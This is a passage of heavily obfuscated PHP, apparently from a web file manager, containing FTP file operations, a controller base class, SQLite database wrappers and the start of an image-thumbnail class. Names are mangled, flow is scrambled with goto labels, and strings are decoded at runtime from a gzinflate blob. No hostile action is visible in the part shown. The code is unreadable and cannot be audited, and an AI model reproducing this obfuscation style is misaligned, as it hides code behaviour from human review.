cæ¥³ÎÃìâ: $F³à‹ä¬ = $this->ftpList($aôäƒ±£ğå); if (!$F³à‹ä¬) { return !1; } if ($eõŠÒ¤ïÓ) { return array($CğİŒµ‚â†[188] => 0, $CğİŒµ‚â†[189] => count($F³à‹ä¬)); } goto aÏ¦¤‰¬ÊÑ; bö¦İÎ£æ: } public function listAll($eé×ß¹Õõ) { goto d×ãö¼İğé; F‡ÙÇïù§“: $AÆŒïÈ£‚Ü = array($CƒÒ¯—®»[73] => array(), $CƒÒ¯—®»[74] => array()); $this->recursionFtpFiles($eé×ß¹Õõ, $AÆŒïÈ£‚Ü); $cõ”–§œÆ„ = array(); goto dã¹¿Ûâœ¾; d×ãö¼İğé: $CƒÒ¯—®» =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$this->_isconn()) { return !1; } $eé×ß¹Õõ = $this->iconvSystem($eé×ß¹Õõ); goto F‡ÙÇïù§“; dã¹¿Ûâœ¾: foreach ($AÆŒïÈ£‚Ü[$CƒÒ¯—®»[74]] as $eêÕÛÃ‚Ö¾) { $cõ”–§œÆ„[] = array($CƒÒ¯—®»[75] => $CƒÒ¯—®»[8] . trim(str_replace($eé×ß¹Õõ, $CƒÒ¯—®»[33], $eêÕÛÃ‚Ö¾), $CƒÒ¯—®»[8]) . $CƒÒ¯—®»[8], $CƒÒ¯—®»[76] => 1, $CƒÒ¯—®»[77] => 0); } foreach ($AÆŒïÈ£‚Ü[$CƒÒ¯—®»[73]] as $cíÎÑ•×±§) { $cõ”–§œÆ„[] = array($CƒÒ¯—®»[75] => $CƒÒ¯—®»[8] . trim(str_replace($eé×ß¹Õõ, $CƒÒ¯—®»[33], $cíÎÑ•×±§), $CƒÒ¯—®»[8]), $CƒÒ¯—®»[76] => 0, $CƒÒ¯—®»[77] => $this->size($cíÎÑ•×±§)); } return $cõ”–§œÆ„; goto aá–Ï¢Ê‚ª; aá–Ï¢Ê‚ª: } public function getContent($A‡ÄâÃæÔ£) { if (!$this->_isconn()) { return !1; } $A‡ÄâÃæÔ£ = $this->iconvSystem($A‡ÄâÃæÔ£); return $this->fileSubstr($A‡ÄâÃæÔ£); } public function setContent($A¬¶Æ—¬Ï, $a‘…ÓÙÔ = '') { goto eù¼ƒÇ­ñ‰; a’É£ò¸›á: return $D¤øÈŸÇ; goto fà»†İğ¸ê; E³å×§ÉÜ: file_put_contents($a¸òÌ­œ±, $a‘…ÓÙÔ); $D¤øÈŸÇ = $this->upload($A¬¶Æ—¬Ï, $this->iconvApp($a¸òÌ­œ±)); $this->tempFileRemve($a¸òÌ­œ±); goto a’É£ò¸›á; eù¼ƒÇ­ñ‰: if (!$this->_isconn()) { return !1; } $dÄ¹Ñ¯àõã = $this->pathThis($this->iconvSystem($A¬¶Æ—¬Ï)); $a¸òÌ­œ± = $this->tempFile($dÄ¹Ñ¯àõã); goto E³å×§ÉÜ; fà»†İğ¸ê: } public function fileSubstr($C¡Ëãª¼½, $FÅË±í´‘ˆ = 0, $cÉ¤ˆğÍ¢Ó = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($C¡Ëãª¼½, $FÅË±í´‘ˆ, $cÉ¤ˆğÍ¢Ó); } private function ftpRequest($a–ÄáîÕÜŸ, $fâöâğ’ã¤ = 0, $E¼Ù¡Ÿ«Š– = false) { goto CíÄÖÁêÉ; cÈßŠ®‡–Ä: curl_setopt($f¯å©Á‹¨, CURLOPT_RETURNTRANSFER, 1); $dîøÌÃÜÒŠ = curl_exec($f¯å©Á‹¨); curl_close($f¯å©Á‹¨); goto cèŒİ¥áÖŞ; cèŒİ¥áÖŞ: return $dîøÌÃÜÒŠ; goto Cƒ–ì»’çÊ; CíÄÖÁêÉ: $a–ÄáîÕÜŸ = $this->iconvSystem($a–ÄáîÕÜŸ); $DÃÍØ°ğ³İ = $this->scheme . $this->host . $_SERVER[ÚŠ•´ÍéÒÑÔ][4] . $this->port; $f¯å©Á‹¨ = curl_init(); goto d¡¢àâå„ß; d¡¢àâå„ß: curl_setopt($f¯å©Á‹¨, CURLOPT_URL, $DÃÍØ°ğ³İ . $this->pathEncode($a–ÄáîÕÜŸ)); curl_setopt($f¯å©Á‹¨, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($E¼Ù¡Ÿ«Š–) { $Dšñ““÷¾· = $fâöâğ’ã¤ + $E¼Ù¡Ÿ«Š– - 1; curl_setopt($f¯å©Á‹¨, CURLOPT_RANGE, "{$fâöâğ’ã¤}\55{$Dšñ““÷¾·}"); } goto cÈßŠ®‡–Ä; Cƒ–ì»’çÊ: } public function upload($AöŞ‡ã¦ÌÉ, $CŸÄ†ñËƒ¨, $d®ƒ¿ƒ™ª‚ = false, $Dª‹½äõÒ¦ = REPEAT_REPLACE) { goto c¸µ­çÌñ; c¸µ­çÌñ: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($AöŞ‡ã¦ÌÉ))) { return !1; } $AöŞ‡ã¦ÌÉ = $this->iconvSystem($AöŞ‡ã¦ÌÉ); goto Eçœè£¦–Ä; Eçœè£¦–Ä: $CŸÄ†ñËƒ¨ = $this->iconvSystem($CŸÄ†ñËƒ¨); $EçÓ¿ÈŒ– = ftp_nb_put($this->connect, $AöŞ‡ã¦ÌÉ, $CŸÄ†ñËƒ¨, FTP_BINARY); while ($EçÓ¿ÈŒ– == FTP_MOREDATA) { $EçÓ¿ÈŒ– = ftp_nb_continue($this->connect); } goto e¤ĞáäÆ‘×; e¤ĞáäÆ‘×: if ($EçÓ¿ÈŒ– != FTP_FINISHED) { return !1; } return $this->getPathOuter($AöŞ‡ã¦ÌÉ); goto eÌá…ö¹È—; eÌá…ö¹È—: } public function download($aè Ğõ½¤, $A˜Àõ¹íÀ = '') { goto aŠ‹®¹–Ÿ; A¶ÃåÈâ Æ: while ($E™ÍÆ°¬áÒ == FTP_MOREDATA) { $E™ÍÆ°¬áÒ = ftp_nb_continue($this->connect); } if ($E™ÍÆ°¬áÒ != FTP_FINISHED) { return !1; } return $this->iconvApp($A˜Àõ¹íÀ); goto d© ×î‡ƒ; a¤†±Ù­ï†: $aè Ğõ½¤ = $this->iconvSystem($aè Ğõ½¤); $A˜Àõ¹íÀ = $this->iconvSystem($A˜Àõ¹íÀ); $E™ÍÆ°¬áÒ = ftp_nb_get($this->connect, $A˜Àõ¹íÀ, $aè Ğõ½¤, FTP_BINARY); goto A¶ÃåÈâ Æ; aŠ‹®¹–Ÿ: if (!$this->_isconn()) { return !1; } $Aœ´æË§¿æ = $this->pathFather($A˜Àõ¹íÀ); if (!IO::mkdir($Aœ´æË§¿æ)) { return !1; } goto a¤†±Ù­ï†; d© ×î‡ƒ: } private function ftpList($cö¢˜‹©) { goto AÍÊ‘¢‚íŒ; eñÉ³²³ëä: $cö¢˜‹© = rtrim($cö¢˜‹©, $A…‹éõ‚šô[8]) . $A…‹éõ‚šô[8]; $cÂìéª‡Õ¨ = @ftp_nlist($this->connect, $cö¢˜‹©); if ($cÂìéª‡Õ¨ === !1) { $cÂìéª‡Õ¨ = @ftp_rawlist($this->connect, $cö¢˜‹©); foreach ($cÂìéª‡Õ¨ as $B¬·»åé¦ç => $f„­²×ˆŒ—) { $cÂìéª‡Õ¨[$B¬·»åé¦ç] = end(explode($A…‹éõ‚šô[1148], $f„­²×ˆŒ—)); } } goto bµÎñÚÒÖ‰; bµÎñÚÒÖ‰: $d÷—Ï‘‰ğô = array(); foreach ($cÂìéª‡Õ¨ as $F¸éµÛÆ˜Š) { if ($F¸éµÛÆ˜Š == $A…‹éõ‚šô[93] || $F¸éµÛÆ˜Š == $A…‹éõ‚šô[1149]) { continue; } if (!strstr($F¸éµÛÆ˜Š, $A…‹éõ‚šô[8])) { $F¸éµÛÆ˜Š = $cö¢˜‹© . ltrim($F¸éµÛÆ˜Š, $A…‹éõ‚šô[8]); } $d÷—Ï‘‰ğô[] = $this->iconvApp($F¸éµÛÆ˜Š); } return $d÷—Ï‘‰ğô; goto BÀ²Áçôæè; AÍÊ‘¢‚íŒ: $A…‹éõ‚šô =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$this->isFolder($cö¢˜‹©)) { return !1; } @ftp_chdir($this->connect, $A…‹éõ‚šô[8]); goto eñÉ³²³ëä; BÀ²Áçôæè: } private function recursionFtpFiles($A¯Ú´‹œ–, &$aÃó¡Ö–Ë›) { $d÷åÛõµĞ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$this->_isconn()) { return !1; } if (!($FÖÚø¯—Ó = $this->ftpList($A¯Ú´‹œ–))) { return !1; } foreach ($FÖÚø¯—Ó as $A¯Ú´‹œ–) { if ($this->isFolder($A¯Ú´‹œ–)) { $this->recursionFtpFiles($A¯Ú´‹œ–, $aÃó¡Ö–Ë›); $aÃó¡Ö–Ë›[$d÷åÛõµĞ[74]][] = $A¯Ú´‹œ–; } else { $aÃó¡Ö–Ë›[$d÷åÛõµĞ[73]][] = $A¯Ú´‹œ–; } } } private function objectMeta($a±õ¸ÓºÑæ) { goto Bˆ…İ­±ò; DŸà´„›‡½: $c¬ĞÁ¦â‘ò = @ftp_size($this->connect, $this->iconvSystem($a±õ¸ÓºÑæ)); if ($c¬ĞÁ¦â‘ò != -1) { $EçîÔÌÏî› = array($A½ª¼Î¸Û‘[77] => $c¬ĞÁ¦â‘ò, $A½ª¼Î¸Û‘[29] => $A½ª¼Î¸Û‘[164]); } else { $dô”¼öœ¦ = @ftp_chdir($this->connect, $this->iconvSystem($a±õ¸ÓºÑæ)); $EçîÔÌÏî› = $dô”¼öœ¦ ? array($A½ª¼Î¸Û‘[77] => 0, $A½ª¼Î¸Û‘[29] => $A½ª¼Î¸Û‘[76]) : !1; } Cache::set($AêæÏŠò¿‚, $EçîÔÌÏî›, 0); goto båË˜¬£ù; eÒáĞ³Ä: if ($EçîÔÌÏî› !== null && $EçîÔÌÏî› !== !1) { return $EçîÔÌÏî›; } if (!$this->_isconn()) { return !1; } @ftp_chdir($this->connect, $A½ª¼Î¸Û‘[8]); goto DŸà´„›‡½; Bˆ…İ­±ò: $A½ª¼Î¸Û‘ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $AêæÏŠò¿‚ = $A½ª¼Î¸Û‘[1150] . md5($a±õ¸ÓºÑæ); $EçîÔÌÏî› = Cache::get($AêæÏŠò¿‚); goto eÒáĞ³Ä; båË˜¬£ù: return $EçîÔÌÏî›; goto B¡‘êéòî; B¡‘êéòî: } } $aÙ©–ÎÙÈÊ = LIB_DIR . $_SERVER[ÚŠ•´ÍéÒÑÔ][1151]; goto fÚ¤ÒÅğ¡¨; EŸÕ…íˆ„: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto b†‚çó’Ş; c¦Ÿáí¤ù§: $this->in =& $in; $this->values[$DÌëæ®Âêº[6]] =& $config; $this->values[$DÌëæ®Âêº[7]] =& $in; goto f¶™øƒ”‰Í; b†‚çó’Ş: $DÌëæ®Âêº =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; global $in, $config; $this->config =& $config; goto c¦Ÿáí¤ù§; f¶™øƒ”‰Í: $this->tpl = TEMPLATE . MOD . $DÌëæ®Âêº[8]; $this->_classObjectID = mt_rand(0, 10000); goto B…°êÖÚ‹Æ; B…°êÖÚ‹Æ: } public function loadClass($EÌ«‰‹Ñƒ±) { if (1 === func_num_args()) { $this->{$EÌ«‰‹Ñƒ±} = new $EÌ«‰‹Ñƒ±(); } else { $B­°¤º„ò = new ReflectionClass($EÌ«‰‹Ñƒ±); $C«Â«¥›—Ï = func_get_args(); array_shift($C«Â«¥›—Ï); $this->{$EÌ«‰‹Ñƒ±} = $B­°¤º„ò->newInstanceArgs($C«Â«¥›—Ï); } return $this->{$EÌ«‰‹Ñƒ±}; } protected function assign($cÖ½öÉ‡ˆá, $eÓù«Å¨Ñ) { $this->values[$cÖ½öÉ‡ˆá] = $eÓù«Å¨Ñ; } protected function display($D‹ğ–™éÒÌ) { ob_end_clean(); extract($this->values); require $this->tpl . $D‹ğ–™éÒÌ; } } class DbSqliteBase extends Db { public function __construct($F ±¿†›ˆ = '') { $b—˜¬ÑÇá… =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!extension_loaded($b—˜¬ÑÇá…[9])) { think_exception(think_lang($b—˜¬ÑÇá…[10]) . $b—˜¬ÑÇá…[11]); } if (!empty($F ±¿†›ˆ)) { if (!isset($F ±¿†›ˆ[$b—˜¬ÑÇá…[12]])) { $F ±¿†›ˆ[$b—˜¬ÑÇá…[12]] = 438; } $this->config = $F ±¿†›ˆ; if (empty($this->config[$b—˜¬ÑÇá…[13]])) { $this->config[$b—˜¬ÑÇá…[13]] = array(); } } } public function connect($D¶ƒÕôñ§ˆ = '', $dµÌÈƒ­‡ì = 0) { $cÙßŒ²®¾‘ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!isset($this->linkID[$dµÌÈƒ­‡ì])) { goto Fİ‡½ÒÏ÷; Bë†´´ˆø©: $this->linkID[$dµÌÈƒ­‡ì] = $BñŠÕ“«‹ß($D¶ƒÕôñ§ˆ[$cÙßŒ²®¾‘[17]], $D¶ƒÕôñ§ˆ[$cÙßŒ²®¾‘[12]]); if (!$this->linkID[$dµÌÈƒ­‡ì]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto Dæ¥ˆÎ“œ½; Fİ‡½ÒÏ÷: if (empty($D¶ƒÕôñ§ˆ)) { $D¶ƒÕôñ§ˆ = $this->config; } $E¼øŠ¯–‡ˆ = !empty($D¶ƒÕôñ§ˆ[$cÙßŒ²®¾‘[13]][$cÙßŒ²®¾‘[14]]) ? $D¶ƒÕôñ§ˆ[$cÙßŒ²®¾‘[13]][$cÙßŒ²®¾‘[14]] : $this->pconnect; $BñŠÕ“«‹ß = $E¼øŠ¯–‡ˆ ? $cÙßŒ²®¾‘[15] : $cÙßŒ²®¾‘[16]; goto Bë†´´ˆø©; Dæ¥ˆÎ“œ½: @sqlite_busy_timeout($this->linkID[$dµÌÈƒ­‡ì], 30000); if (1 != think_config($cÙßŒ²®¾‘[18])) { unset($this->config); } goto aÛÍº£ÃñÓ; aÛÍº£ÃñÓ: } return $this->linkID[$dµÌÈƒ­‡ì]; } public function free() { $this->queryID = null; } public function query($c‡…µ‡Ñ‚) { goto d¸Á¿ìèÔ; bŸñ¼½Şñƒ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $EÁ³Ÿ¾ö« = $this->getAll(); return $EÁ³Ÿ¾ö«; } goto Fã‹’ƒÈÇ; d¸Á¿ìèÔ: $fˆßñæ¤ßÓ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto Bæ³ÉÃ‘˜¥; B”ÔÄ–•µ…: think_status($fˆßñæ¤ßÓ[20]); $this->queryID = sqlite_query($this->_linkID, $c‡…µ‡Ñ‚); $this->debug(); goto bŸñ¼½Şñƒ; Bæ³ÉÃ‘˜¥: $this->queryStr = $c‡…µ‡Ñ‚; if ($this->queryID) { $this->free(); } think_action_status($fˆßñæ¤ßÓ[19], 1); goto B”ÔÄ–•µ…; Fã‹’ƒÈÇ: } public function execute($B»„˜ÇŸ©Ä) { goto CĞ÷˜”»™ñ; aïí–àÑÑ‘: $this->queryStr = $B»„˜ÇŸ©Ä; if ($this->queryID) { $this->free(); } think_action_status($F÷‰­ª†ò[21], 1); goto eÛ÷îï¨¡³; CĞ÷˜”»™ñ: $F÷‰­ª†ò =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto aïí–àÑÑ‘; CËõØÜ‚›: if (!1 === $Aëæ«õ¯È–) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto e‡öõ‰¡Ùî; eÛ÷îï¨¡³: think_status($F÷‰­ª†ò[20]); $Aëæ«õ¯È– = sqlite_exec($this->_linkID, $B»„˜ÇŸ©Ä); $this->debug(); goto CËõØÜ‚›; e‡öõ‰¡Ùî: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[ÚŠ•´ÍéÒÑÔ][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $f½óáÈƒ¤ = sqlite_query($this->_linkID, $_SERVER[ÚŠ•´ÍéÒÑÔ][23]); if (!$f½óáÈƒ¤) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $EÙ‚ãßïŠ° = sqlite_query($this->_linkID, $_SERVER[ÚŠ•´ÍéÒÑÔ][24]); if (!$EÙ‚ãßïŠ°) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $E«¦®Ğ•·³ = array(); if ($this->numRows > 0) { for ($F¯Ñ¿ÈË = 0; $F¯Ñ¿ÈË < $this->numRows; $F¯Ñ¿ÈË++) { $E«¦®Ğ•·³[$F¯Ñ¿ÈË] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $E«¦®Ğ•·³; } public function getFields($F³¯¯¦ŠÑÃ) { $F‚¬•Ø™ÉÁ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $a®¥ö“ËË¨ = $this->query($F‚¬•Ø™ÉÁ[25] . $F³¯¯¦ŠÑÃ . $F‚¬•Ø™ÉÁ[26]); $a©Ü—²óå = array(); if ($a®¥ö“ËË¨) { foreach ($a®¥ö“ËË¨ as $aòÌ¬ÓĞßÏ => $C÷øî¢ öÁ) { $a©Ü—²óå[$C÷øî¢ öÁ[$F‚¬•Ø™ÉÁ[27]]] = array($F‚¬•Ø™ÉÁ[28] => $C÷øî¢ öÁ[$F‚¬•Ø™ÉÁ[27]], $F‚¬•Ø™ÉÁ[29] => $C÷øî¢ öÁ[$F‚¬•Ø™ÉÁ[30]], $F‚¬•Ø™ÉÁ[31] => (bool) ($C÷øî¢ öÁ[$F‚¬•Ø™ÉÁ[32]] === $F‚¬•Ø™ÉÁ[33]), $F‚¬•Ø™ÉÁ[34] => $C÷øî¢ öÁ[$F‚¬•Ø™ÉÁ[35]], $F‚¬•Ø™ÉÁ[36] => strtolower($C÷øî¢ öÁ[$F‚¬•Ø™ÉÁ[37]]) == $F‚¬•Ø™ÉÁ[38], $F‚¬•Ø™ÉÁ[39] => strtolower($C÷øî¢ öÁ[$F‚¬•Ø™ÉÁ[40]]) == $F‚¬•Ø™ÉÁ[41]); } } return $a©Ü—²óå; } public function getTables($a Ù®ÎïÒË = '') { $aåßÈ£÷˜ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $d‚‡©öñæá = $this->query($aåßÈ£÷˜[42] . $aåßÈ£÷˜[43] . $aåßÈ£÷˜[44]); $eË°Ş›åŒ§ = array(); foreach ($d‚‡©öñæá as $Dõ†İŞß·‹ => $eÜÄä âÏ) { $eË°Ş›åŒ§[$Dõ†İŞß·‹] = current($eÜÄä âÏ); } return $eË°Ş›åŒ§; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $f®‰Ğ·İ¡ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $f ­¥±Í = sqlite_last_error($this->_linkID); $this->error = $f ­¥±Í . $f®‰Ğ·İ¡[4] . sqlite_error_string($f ­¥±Í); if ($f®‰Ğ·İ¡[33] != $this->queryStr) { $this->error .= LNG($f®‰Ğ·İ¡[45]) . $this->queryStr; } think_trace($this->error, $f®‰Ğ·İ¡[33], $f®‰Ğ·İ¡[46]); return $this->error; } public function escapeString($f…ÃÇÃ¯ò) { return sqlite_escape_string($f…ÃÇÃ¯ò); } public function parseLimit($EÓ´í¬ÃíŒ) { $C¸¼¬ïº =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $AŒº¬ŒÁ•Õ = $C¸¼¬ïº[33]; if (!empty($EÓ´í¬ÃíŒ)) { $EÓ´í¬ÃíŒ = explode($C¸¼¬ïº[47], $EÓ´í¬ÃíŒ); if (count($EÓ´í¬ÃíŒ) > 1) { $AŒº¬ŒÁ•Õ .= $C¸¼¬ïº[48] . $EÓ´í¬ÃíŒ[1] . $C¸¼¬ïº[49] . $EÓ´í¬ÃíŒ[0] . $C¸¼¬ïº[50]; } else { $AŒº¬ŒÁ•Õ .= $C¸¼¬ïº[48] . $EÓ´í¬ÃíŒ[0] . $C¸¼¬ïº[50]; } } return $AŒº¬ŒÁ•Õ; } } class DbSqlite3Base extends Db { public function __construct($C›¥©áÛ = '') { $EŠ¶áªŒéù =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!class_exists($EŠ¶áªŒéù[51])) { think_exception(think_lang($EŠ¶áªŒéù[10]) . $EŠ¶áªŒéù[52]); } if (!empty($C›¥©áÛ)) { if (!isset($C›¥©áÛ[$EŠ¶áªŒéù[12]])) { $C›¥©áÛ[$EŠ¶áªŒéù[12]] = 438; } $this->config = $C›¥©áÛ; if (empty($this->config[$EŠ¶áªŒéù[13]])) { $this->config[$EŠ¶áªŒéù[13]] = array(); } } } public function connect($Aó¡öÀïµŒ = '', $A„äƒ›á “ = 0) { $eŠ‚Ï¦¤ÖÒ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!isset($this->linkID[$A„äƒ›á “])) { if (empty($Aó¡öÀïµŒ)) { $Aó¡öÀïµŒ = $this->config; } $this->linkID[$A„äƒ›á “] = new SQLite3($Aó¡öÀïµŒ[$eŠ‚Ï¦¤ÖÒ[17]]); if (!$this->linkID[$A„äƒ›á “]) { think_exception($this->linkID[$A„äƒ›á “]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$A„äƒ›á “]->busyTimeout(30000); if (1 != think_config($eŠ‚Ï¦¤ÖÒ[18])) { unset($this->config); } } return $this->linkID[$A„äƒ›á “]; } public function free() { $this->queryID = null; } public function query($C«–ˆÏ„Ú) { goto F‘¹£®¹‡‘; F‘¹£®¹‡‘: $c¯»ÇŒè‹„ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto Câƒã†êË›; f‹ç³ùÛ»«: if (!1 === $this->queryID) { $this->error(); return !1; } else { $eÉŒÛëÇÉ³ = $this->getAll(); $this->numRows = count($eÉŒÛëÇÉ³); return $eÉŒÛëÇÉ³; } goto e¿Çä‚›ä; Câƒã†êË›: $this->queryStr = $C«–ˆÏ„Ú; if ($this->queryID) { $this->free(); } think_action_status($c¯»ÇŒè‹„[19], 1); goto AšåÛÈÈÄ›; AšåÛÈÈÄ›: think_status($c¯»ÇŒè‹„[20]); $this->queryID = $this->_linkID->query($C«–ˆÏ„Ú); $this->debug(); goto f‹ç³ùÛ»«; e¿Çä‚›ä: } public function execute($dèÃ®¨èƒÏ) { goto Cœ›ƒİ…ˆ; aª†ÂßÆ š: $this->queryStr = $dèÃ®¨èƒÏ; if ($this->queryID) { $this->free(); } think_action_status($BÚã¾ÌÜÀ£[21], 1); goto CÙí‹àÎÅõ; a£î†É…ÇÒ: if (!1 === $fó¶Šƒ«‘) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto c•óø¿Ë…í; Cœ›ƒİ…ˆ: $BÚã¾ÌÜÀ£ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto aª†ÂßÆ š; CÙí‹àÎÅõ: think_status($BÚã¾ÌÜÀ£[20]); $fó¶Šƒ«‘ = $this->_linkID->exec($dèÃ®¨èƒÏ); $this->debug(); goto a£î†É…ÇÒ; c•óø¿Ë…í: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[ÚŠ•´ÍéÒÑÔ][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Dğ£Á·»³Ÿ = $this->_linkID->query($_SERVER[ÚŠ•´ÍéÒÑÔ][23]); if (!$Dğ£Á·»³Ÿ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $E±ƒÑØ–œÆ = $this->_linkID->query($_SERVER[ÚŠ•´ÍéÒÑÔ][24]); if (!$E±ƒÑØ–œÆ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $CÏ–í¹·ƒ… = array(); while ($EÁäÅùİÒÙ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $CÏ–í¹·ƒ…[] = $EÁäÅùİÒÙ; } $this->queryID->reset(); return $CÏ–í¹·ƒ…; } public function getFields($BŞÀˆáí×Ó) { $fƒŒ¤Ûì¥Ú =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $c¢ÂÇóŒø¶ = $this->query($fƒŒ¤Ûì¥Ú[25] . $BŞÀˆáí×Ó . $fƒŒ¤Ûì¥Ú[26]); $aÆÉŒÓó“ˆ = array(); if ($c¢ÂÇóŒø¶) { foreach ($c¢ÂÇóŒø¶ as $eš³âˆÎ¥ö => $Cµ•¯Â”ãŠ) { $aÆÉŒÓó“ˆ[$Cµ•¯Â”ãŠ[$fƒŒ¤Ûì¥Ú[28]]] = array($fƒŒ¤Ûì¥Ú[28] => $Cµ•¯Â”ãŠ[$fƒŒ¤Ûì¥Ú[28]], $fƒŒ¤Ûì¥Ú[29] => $Cµ•¯Â”ãŠ[$fƒŒ¤Ûì¥Ú[29]], $fƒŒ¤Ûì¥Ú[31] => (bool) ($Cµ•¯Â”ãŠ[$fƒŒ¤Ûì¥Ú[31]] === $fƒŒ¤Ûì¥Ú[33]), $fƒŒ¤Ûì¥Ú[34] => $Cµ•¯Â”ãŠ[$fƒŒ¤Ûì¥Ú[53]], $fƒŒ¤Ûì¥Ú[36] => (bool) $Cµ•¯Â”ãŠ[$fƒŒ¤Ûì¥Ú[54]], $fƒŒ¤Ûì¥Ú[39] => (bool) $Cµ•¯Â”ãŠ[$fƒŒ¤Ûì¥Ú[54]]); } } return $aÆÉŒÓó“ˆ; } public function getTables($bÌõĞæÃ¿Ç = '') { $D—óãÕæğ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $F™‚ìÁİ¾¼ = $this->query($D—óãÕæğ[42] . $D—óãÕæğ[43] . $D—óãÕæğ[44]); $E”–‘Êà³Ç = array(); foreach ($F™‚ìÁİ¾¼ as $eÙ‡‹‹ëù => $Bõ¶Íˆ—Å) { $E”–‘Êà³Ç[$eÙ‡‹‹ëù] = current($Bõ¶Íˆ—Å); } return $E”–‘Êà³Ç; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $A­äˆ«ß–£ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $this->error = $this->_linkID->lastErrorMsg(); if ($A­äˆ«ß–£[33] != $this->queryStr) { $this->error .= LNG($A­äˆ«ß–£[45]) . $this->queryStr; } think_trace($this->error, $A­äˆ«ß–£[33], $A­äˆ«ß–£[46]); return $this->error; } public function escapeString($Dî¥æŸÈ¨÷) { $d­¢íÚáÊ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if ($this->_linkID) { return $this->_linkID->escapeString($Dî¥æŸÈ¨÷); } return str_ireplace($d­¢íÚáÊ[55], $d­¢íÚáÊ[56], $Dî¥æŸÈ¨÷); } public function parseLimit($AÂìõšäï‹) { $F—ä›¾ƒâ— =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $DÅ»Ú®¼ƒƒ = $F—ä›¾ƒâ—[33]; if (!empty($AÂìõšäï‹)) { $AÂìõšäï‹ = explode($F—ä›¾ƒâ—[47], $AÂìõšäï‹); if (count($AÂìõšäï‹) > 1) { $DÅ»Ú®¼ƒƒ .= $F—ä›¾ƒâ—[48] . $AÂìõšäï‹[1] . $F—ä›¾ƒâ—[49] . $AÂìõšäï‹[0] . $F—ä›¾ƒâ—[50]; } else { $DÅ»Ú®¼ƒƒ .= $F—ä›¾ƒâ—[48] . $AÂìõšäï‹[0] . $F—ä›¾ƒâ—[50]; } } return $DÅ»Ú®¼ƒƒ; } } goto EˆÄ·‹Õ¨‰; AŒÖ‘áåš—: function beforeShutdown() { Hook::trigger($_SERVER[Ÿ²ù¬][36]); } $_SERVER[$_SERVER[Ÿ²ù¬][37]] = BASIC_PATH; $_SERVER[$_SERVER[Ÿ²ù¬][38]] = LIB_DIR; goto c°Ù•øåƒ; C——‚Ÿƒø¼: define($_SERVER[ÚŠ•´ÍéÒÑÔ][1903], 4); define($_SERVER[ÚŠ•´ÍéÒÑÔ][1904], 5); define($_SERVER[ÚŠ•´ÍéÒÑÔ][1905], 16); goto C®êÂ¥Œí¥; añ‹ƒÔÈ»: $Døìäë—¡ = $_SERVER[ÚŠ•´ÍéÒÑÔ][543]; $_SERVER[§ŠùÊÊÛ©»] = explode($_SERVER[ÚŠ•´ÍéÒÑÔ][544], gzinflate(substr($_SERVER[ÚŠ•´ÍéÒÑÔ][545], 10, -8))); $D­¸£¨ó° = $_SERVER[ÚŠ•´ÍéÒÑÔ][546]; goto B§å—‡ÃÑ; AÊá‚­°: class ImageThumb { var $srcFile = ''; var $imgData = ''; var $echoType; var $im = ''; var $srcW = ''; var $srcH = ''; function __construct($cÌ‘½§ëÙÕ, $e’ÛÉ±Á) { goto EÖ×ò¸™¥‚; AµŠîî’³Á: if (!$this->im) { return !1; } $FòàÉ®¸Å = $_SERVER[ÚŠ•´ÍéÒÑÔ][33]; $this->imgData = GetImageSize($cÌ‘½§ëÙÕ, $FòàÉ®¸Å); goto 